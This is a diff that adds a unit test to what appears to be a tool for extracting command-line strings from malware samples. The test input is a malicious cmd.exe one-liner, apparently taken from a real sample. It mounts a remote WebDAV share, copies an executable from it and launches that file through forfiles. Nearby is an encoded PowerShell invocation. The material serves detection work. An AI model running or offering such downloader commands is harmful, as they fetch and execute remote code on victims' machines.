@@ -103,6 +103,19 @@ def test_find_cmd_strings_with_combo_of_ps1_and_cmd():
     ]
 
 
+# From c8004f944055296f2636a64f8a469b9db6c9e983305f83ddc50c0617950d2271
+def test_find_cmd_strings_with_dynamic_cmd():
+    ex = b'"C:\\WINDOWS\\system32\\cmd.exe" /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv /user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe  & net use * /d /y"'
+    assert find_cmd_strings(ex) == [
+        Node(
+            type_="shell.cmd",
+            value=b'cmd.exe /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv /user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe & net use * /d /y"',
+            start=21,
+            end=250,
+        )
+    ]
+
+
 # find_powershell_strings
 def test_find_powershell_strings_enc():
     ex = b"powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=="
